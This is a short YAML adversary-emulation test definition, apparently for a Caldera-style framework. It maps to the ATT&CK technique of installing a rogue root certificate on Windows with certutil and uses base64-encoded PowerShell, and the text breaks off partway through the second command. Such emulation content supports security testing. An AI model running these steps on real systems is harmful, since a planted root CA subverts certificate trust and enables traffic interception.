- id: 6cef79b4-9daf-5719-9247-908376956e5b
  name: Soumaia ART Tests - Install root CA on Windows with certutil
  description: Creates a root CA with certutil (requires elevation)
  tactic: defense-impairment
  technique:
    attack_id: T1553.004
    name: 'Subvert Trust Controls: Install Root Certificate'
  platforms:
    windows:
      psh:
        command: |-
          powershell -NoProfile -EncodedCommand aQBmACAAKABUAGUAcwB0AC0AUABhAHQAaAAgACQAZQBuAHYAOgBUAGUAbQBwAFwAcgBvAG8AdABDAEEAMgAuAGMAZQByACkAIAB7ACAAZQB4AGkAdAAgADAAIAB9ACAAZQBsAHMAZQAgAHsAIABlAHgAaQB0ACAAMQAgAH0ACgA=
          if ($LASTEXITCODE -ne 0) {
              powershell -NoProfile -EncodedCommand 
